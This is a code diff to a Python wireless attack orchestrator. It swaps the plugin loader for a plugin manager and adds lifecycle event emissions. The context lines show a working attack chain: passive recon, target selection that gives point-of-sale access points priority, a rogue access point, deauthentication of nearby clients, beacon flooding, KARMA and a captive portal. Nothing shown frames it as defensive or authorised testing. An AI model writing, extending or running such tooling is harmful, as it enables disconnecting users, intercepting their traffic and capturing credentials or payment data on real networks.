@@ -28,6 +28,7 @@ from .recon import ReconEngine
 from .deauth import DeauthEngine
 from .handshake import HandshakeCapture
 from .signal_targeting import SignalTargeting
+from .event_bus import get_event_bus, EventType
 
 
 class AttackOrchestrator:
@@ -138,18 +139,21 @@ class AttackOrchestrator:
         self.network_mapper = None
 
         # Plugin system
-        self._plugin_loader = None
+        self._plugin_manager = None
         self._active_plugins = []
         self._plugins_dir = plugins_dir
         self._requested_plugins = plugins  # list of plugin names to enable
+
+        # Event bus for lifecycle events
+        self._event_bus = get_event_bus()
 
         self.running = False
 
     def load_plugins(self, plugin_dirs=None):
         """
-        Discover and load available attack plugins.
+        Discover and load available attack plugins using the new PluginManager.
 
-        This method initializes the PluginLoader, scans the default
+        This method initializes the PluginManager, scans the default
         plugins directory (and any additional dirs), and optionally
         enables only the plugins specified in self._requested_plugins.
 
@@ -159,31 +163,36 @@ class AttackOrchestrator:
         Returns:
             Number of plugins loaded.
         """
-        from .plugin_loader import PluginLoader
+        from .plugin_system import PluginManager
+        from pathlib import Path
 
-        dirs = []
+        self._plugin_manager = PluginManager()
+        total_discovered = 0
+
+        # Default plugins directory
+        default_dir = Path(__file__).parent / "plugins"
+        if default_dir.is_dir():
+            total_discovered += self._plugin_manager.discover(default_dir)
+
+        # Additional directories
         if self._plugins_dir:
-            dirs.append(self._plugins_dir)
+            p = Path(self._plugins_dir)
+            if p.is_dir():
+                total_discovered += self._plugin_manager.discover(p)
+
         if plugin_dirs:
-            dirs.extend(plugin_dirs)
+            for d in plugin_dirs:
+                p = Path(d)
+                if p.is_dir():
+                    total_discovered += self._plugin_manager.discover(p)
 
-        self._plugin_loader = PluginLoader(plugin_dirs=dirs if dirs else None)
-        count = self._plugin_loader.discover()
+        log.info(f"Plugin system: {total_discovered} discovered, "
+                 f"{len(self._plugin_manager.list_loaded())} loaded")
+        return total_discovered
 
-        # If specific plugins were requested, disable all others
-        if self._requested_plugins:
-            for plugin in self._plugin_loader.list_plugins():
-                if plugin.name() not in self._requested_plugins:
-                    self._plugin_loader.disable_plugin(plugin.name())
-
-        self._active_plugins = self._plugin_loader.get_enabled_plugins()
-        log.info(f"Plugin system: {count} discovered, "
-                 f"{len(self._active_plugins)} active")
-        return count
-
-    def get_plugin_loader(self):
-        """Return the PluginLoader instance (or None if not initialized)."""
-        return self._plugin_loader
+    def get_plugin_manager(self):
+        """Return the PluginManager instance (or None if not initialized)."""
+        return self._plugin_manager
 
     def _auto_select_target(self):
         """Select target from recon data. POS APs get priority."""
@@ -236,6 +245,13 @@ class AttackOrchestrator:
         self._attack_start_time = time.time()
         log.info(f"Attack chain initiated at {time.strftime('%Y-%m-%d %H:%M:%S')}")
 
+        # Emit system starting event
+        self._event_bus.emit_sync(EventType.SYSTEM_STARTING, {
+            "monitor_iface": self.monitor_iface,
+            "ap_iface": self.ap_iface,
+            "timestamp": self._attack_start_time,
+        }, source="orchestrator")
+
         # ── Phase 1: Passive Recon ────────────────────────────────────────────
         log.info(f"Phase 1: Passive recon ({self.recon_duration}s)...")
         self.recon.set_signal_targeting(self.signal_filter)
@@ -251,6 +267,13 @@ class AttackOrchestrator:
         if not self._auto_select_target():
             self.running = False
             return False
+
+        # Emit AP discovered event for the selected target
+        self._event_bus.emit_sync(EventType.AP_DISCOVERED, {
+            "bssid": self.target_bssid,
+            "ssid": self.target_ssid,
+            "channel": self.target_channel,
+        }, source="orchestrator")
 
         # ── Phase 2b: Check for client isolation ──────────────────────────────
         if self.enable_isolation_check:
@@ -277,6 +300,14 @@ class AttackOrchestrator:
                  f"{len(close_clients)} within signal range (RSSI > {self.signal_rssi_limit}dBm)")
 
         # ── Phase 3: Rogue AP (uses scanned SSID + channel) ──────────────────
+        # Emit attack started event
+        self._event_bus.emit_sync(EventType.ATTACK_STARTED, {
+            "target_bssid": self.target_bssid,
+            "target_ssid": self.target_ssid,
+            "target_channel": self.target_channel,
+            "clients_in_range": len(close_clients),
+        }, source="orchestrator")
+
         rogue_mac = str(RandMAC())
         self.rogue_ap = RogueAPEngine(
             interface=self.ap_iface,
@@ -293,6 +324,12 @@ class AttackOrchestrator:
         # ── Phase 4: Deauth (targets scanned clients with signal filtering) ───
         self.deauth.add_target(self.target_bssid, close_clients)
         self.deauth.start()
+
+        # Emit deauth sent event
+        self._event_bus.emit_sync(EventType.DEAUTH_SENT, {
+            "target_bssid": self.target_bssid,
+            "clients_targeted": list(close_clients),
+        }, source="orchestrator")
 
         # ── Phase 5: Beacon Flood (uses probed SSIDs from scan) ──────────────
         if self.enable_beacons:
@@ -399,6 +436,14 @@ class AttackOrchestrator:
         log.info(f"  KARMA:   {'Active' if self.enable_karma else 'Disabled'}")
         log.info(f"  Portal:  http://{self.rogue_ap.mac_address and '10.0.0.1'}:80")
         log.info("=" * 60)
+
+        # Emit attack completed (all modules launched)
+        self._event_bus.emit_sync(EventType.ATTACK_COMPLETED, {
+            "target_bssid": self.target_bssid,
+            "target_ssid": self.target_ssid,
+            "modules_active": True,
+        }, source="orchestrator")
+
         return True
 
     def _background_recon(self):
@@ -500,6 +545,11 @@ class AttackOrchestrator:
     def stop(self):
         """Shut down all attack components gracefully."""
         self.running = False
+
+        # Emit system stopping event
+        self._event_bus.emit_sync(EventType.SYSTEM_STOPPING, {
+            "reason": "user_initiated",
+        }, source="orchestrator")
 
         if hasattr(self, '_attack_start_time'):
             duration = time.time() - self._attack_start_time
